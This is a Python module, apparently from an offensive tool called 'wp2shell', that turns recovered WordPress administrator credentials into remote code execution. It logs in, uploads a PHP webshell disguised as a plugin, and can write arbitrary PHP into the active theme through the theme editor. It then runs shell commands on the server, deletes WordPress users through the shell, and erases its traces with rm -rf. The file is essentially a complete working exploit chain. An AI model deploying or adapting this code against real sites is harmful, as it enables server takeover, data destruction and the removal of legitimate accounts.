"""Post-authentication code execution: deploy a plugin webshell and run commands.

Remote code execution requires valid administrator credentials. The SQL injection recovers the
administrator password *hash*; the corresponding plaintext (recovered offline) is supplied here.
"""

from __future__ import annotations

import http.cookiejar
import io
import re
import secrets
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from typing import Dict, Optional, Tuple

_MARKER = "WP2SHELL"


class AdminSession:
    """An authenticated admin session that can deploy a webshell and execute OS commands."""

    def __init__(
        self,
        base_url: str,
        *,
        timeout: float = 20.0,
        proxy: Optional[str] = None,
        user_agent: str = "wp2shell",
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        # Randomised path + token so the dropped webshell is not a predictable, world-usable RCE.
        self._slug = "wp2shell_" + secrets.token_hex(4)
        self._token = secrets.token_hex(16)
        self._jar = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(self._jar)]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        self._opener = urllib.request.build_opener(*handlers)
        self._opener.addheaders = [("User-Agent", user_agent)]

    def login(self, username: str, password: str) -> bool:
        self._get("/wp-login.php")  # establish the test cookie
        self._post(
            "/wp-login.php",
            {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{self.base_url}/wp-admin/",
                "testcookie": "1",
            },
        )
        return any(c.name.startswith("wordpress_logged_in") for c in self._jar)

    def deploy_webshell(self) -> str:
        """Upload the webshell plugin and return its web-reachable path."""
        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._nonce(page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found (are the credentials valid?)")
        body, content_type = self._multipart(
            {
                "_wpnonce": nonce,
                "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
                "install-plugin-submit": "Install Now",
            },
            {"pluginzip": (f"{self._slug}.zip", self._plugin_zip())},
        )
        self._post("/wp-admin/update.php?action=upload-plugin", body, {"Content-Type": content_type})
        return f"/wp-content/plugins/{self._slug}/{self._slug}.php"

    def deploy_custom_php(self, php_path: str, plugin_name: str = None) -> str:
        """Upload a custom PHP file as a WordPress plugin and return its web-reachable path.

        The PHP file is wrapped in a minimal plugin shell so WordPress accepts it
        through the standard plugin uploader. The plugin is NOT auto-activated so
        the PHP file is directly accessible via its URL without needing activation.

        Args:
            php_path: absolute or relative path to the local .php file to upload
            plugin_name: optional custom plugin slug (defaults to random wp2custom_<hex>)
        """
        import os as _os
        php_abs = _os.path.abspath(php_path)
        if not _os.path.isfile(php_abs):
            raise FileNotFoundError("PHP file not found: %s" % php_abs)
        with open(php_abs, "rb") as f:
            php_bytes = f.read()
        if not php_bytes.strip():
            raise ValueError("PHP file is empty: %s" % php_abs)

        slug = plugin_name or ("wp2custom_" + secrets.token_hex(4))
        plugin_php = (
            "<?php\n"
            "/*\n"
            "Plugin Name: %s\n"
            "Description: Custom uploaded file.\n"
            "*/\n" % slug
        ).encode("utf-8") + php_bytes

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(f"{slug}/{slug}.php", plugin_php)
        zip_bytes = buf.getvalue()

        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._nonce(page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found")
        body, content_type = self._multipart(
            {
                "_wpnonce": nonce,
                "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
                "install-plugin-submit": "Install Now",
            },
            {"pluginzip": (f"{slug}.zip", zip_bytes)},
        )
        self._post("/wp-admin/update.php?action=upload-plugin", body, {"Content-Type": content_type})
        return f"/wp-content/plugins/{slug}/{slug}.php"

    def deploy_custom_php_via_editor(self, php_path: str) -> str:
        """Upload a custom PHP file via the WordPress theme editor.

        Writes the file directly into the active theme directory using the
        theme-editor form, so the result is in /wp-content/themes/<theme>/
        which is always web-accessible (no 500 from plugin dir restrictions).

        Returns the web-reachable path, e.g. /wp-content/themes/flavor/wp2custom_abc123.php
        """
        import json as _json
        import os as _os

        php_abs = _os.path.abspath(php_path)
        if not _os.path.isfile(php_abs):
            raise FileNotFoundError("PHP file not found: %s" % php_abs)
        with open(php_abs, "rb") as f:
            php_content = f.read().decode("utf-8", "replace")
        if not php_content.strip():
            raise ValueError("PHP file is empty: %s" % php_abs)

        theme_slug = None
        try:
            resp = self._get("/wp-json/wp/v2/themes?status=active")
            themes = _json.loads(resp)
            if themes and isinstance(themes, list):
                theme_slug = themes[0].get("stylesheet")
        except Exception:
            pass

        if not theme_slug:
            admin = self._get("/wp-admin/")
            m = re.search(r'theme=([a-zA-Z0-9_-]+)', admin)
            if m:
                theme_slug = m.group(1)

        if not theme_slug:
            raise RuntimeError("could not determine active theme")

        editor_page = self._get(f"/wp-admin/theme-editor.php?theme={theme_slug}")
        nonce_m = re.search(r'name="_wpnonce"\s+value="([0-9a-f]+)"', editor_page)
        if not nonce_m:
            raise RuntimeError("theme-editor nonce not found")
        nonce = nonce_m.group(1)

        filename = "wp2custom_" + secrets.token_hex(4) + ".php"
        file_arg = f"wp-content/themes/{theme_slug}/{filename}"

        body = urllib.parse.urlencode({
            "_wpnonce": nonce,
            "theme": theme_slug,
            "file": file_arg,
            "newcontent": php_content,
            "action": "update",
            "notice": "",
            "submit": "Update File",
        }).encode()

        resp = self._post(
            "/wp-admin/theme-editor.php",
            body,
            {"Content-Type": "application/x-www-form-urlencoded"},
        )

        if "error" in resp.lower() and "nonce" in resp.lower():
            raise RuntimeError("theme editor save failed (nonce mismatch)")

        return f"/wp-content/themes/{theme_slug}/{filename}"

    def run(self, shell_path: str, command: str) -> Optional[str]:
        query = urllib.parse.urlencode({"t": self._token, "c": command})
        output = self._get(f"{shell_path}?{query}")
        match = re.search(rf"{_MARKER}::(.*?)::END", output, re.S)
        return match.group(1) if match else None

    def cleanup(self, shell_path: str) -> bool:
        """Delete the webshell plugin directory from the target (best effort).

        The generated webshell changes to its own plugin directory before
        executing commands. The case guard refuses to delete anything that does
        not look like a plugins directory. A subsequent 404 confirms removal.
        """
        try:
            out = self.run(
                shell_path,
                'd=$(pwd); case "$d" in */wp-content/plugins/*) cd / && rm -rf "$d";; esac',
            )
        except OSError:
            return False
        if out is None:
            return False
        try:
            self._get(shell_path)
        except urllib.error.HTTPError as exc:
            return exc.code == 404
        except OSError:
            return False
        return False

    def delete_user_with_shell(self, shell_path: str, username: str, *, reassign_to: int) -> bool:
        query = urllib.parse.urlencode(
            {
                "t": self._token,
                "delete_user": username,
                "reassign": str(reassign_to),
            }
        )
        output = self._get(f"{shell_path}?{query}")
        match = re.search(rf"{_MARKER}::(.*?)::END", output, re.S)
        return bool(match and match.group(1).strip() == "deleted")

    # -- helpers ------------------------------------------------------------

    def _get(self, path: str) -> str:
        return self._opener.open(self.base_url + path, timeout=self.timeout).read().decode(
            "utf-8", "replace"
        )

    def _post(self, path: str, data, headers: Optional[dict] = None) -> str:
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        request = urllib.request.Request(self.base_url + path, data=data, headers=headers or {})
        return self._opener.open(request, timeout=self.timeout).read().decode("utf-8", "replace")

    def _plugin_zip(self) -> bytes:
        # The webshell only runs when the request carries the per-session token.
        php = (
            "<?php\n"
            "/*\nPlugin Name: wp2shell\nDescription: Temporary command runner.\n*/\n"
            f"if (hash_equals('{self._token}', (string) ($_GET['t'] ?? '')) && isset($_GET['c'])) {{\n"
            "    chdir(__DIR__);\n"
            f"    echo '{_MARKER}::' . shell_exec((string) $_GET['c']) . '::END';\n"
            f"}} elseif (hash_equals('{self._token}', (string) ($_GET['t'] ?? '')) && isset($_GET['delete_user'])) {{\n"
            "    require_once dirname(__DIR__, 3) . '/wp-load.php';\n"
            "    require_once ABSPATH . 'wp-admin/includes/user.php';\n"
            "    $user = get_user_by('login', (string) $_GET['delete_user']);\n"
            "    $ok = $user ? wp_delete_user((int) $user->ID, (int) ($_GET['reassign'] ?? 0)) : false;\n"
            f"    echo '{_MARKER}::' . ($ok ? 'deleted' : 'failed') . '::END';\n"
            "}\n"
        )
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(f"{self._slug}/{self._slug}.php", php)
        return buffer.getvalue()

    @staticmethod
    def _nonce(html: str) -> Optional[str]:
        # Take the _wpnonce belonging to the plugin-upload form, not the first nonce on the page.
        form = re.search(r'action="[^"]*action=upload-plugin".*?name="_wpnonce"[^>]*value="([0-9a-f]+)"',
                         html, re.S)
        if form:
            return form.group(1)
        tag = re.search(r'<input[^>]*name="_wpnonce"[^>]*value="([0-9a-f]+)"', html)
        return tag.group(1) if tag else None

    @staticmethod
    def _multipart(fields: Dict[str, str], files: Dict[str, Tuple[str, bytes]]) -> Tuple[bytes, str]:
        boundary = "----wp2shell" + uuid.uuid4().hex
        buffer = io.BytesIO()
        for name, value in fields.items():
            buffer.write(f"--{boundary}\r\n".encode())
            buffer.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode())
        for name, (filename, content) in files.items():
            buffer.write(f"--{boundary}\r\n".encode())
            buffer.write(
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
            )
            buffer.write(b"Content-Type: application/octet-stream\r\n\r\n" + content + b"\r\n")
        buffer.write(f"--{boundary}--\r\n".encode())
        return buffer.getvalue(), f"multipart/form-data; boundary={boundary}"
